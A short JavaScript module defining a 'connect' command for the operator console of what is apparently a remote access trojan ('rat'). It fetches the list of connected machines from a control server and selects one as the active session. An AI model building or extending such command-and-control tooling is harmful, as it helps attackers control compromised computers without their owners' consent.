const axios = require("axios").default;

module.exports = class ConnectCommand {

    constructor() {
        this.name = "connect";
        this.description = "Connect to a rat";
    };

    async run({ args, server, cli }) {
        if (!args.length) return console.log("This command requires arguments");

        const rats = (await axios.get(`http://${process.env.HOST}/rats`)).data;

        if (!rats.length) return console.log("No rats are connected");
        if (!rats.includes(args[0])) return console.log(`Rat not found: ${args[0]}`);

        const rat = server.get(args[0]);
        cli.rat = args[0];
    };

};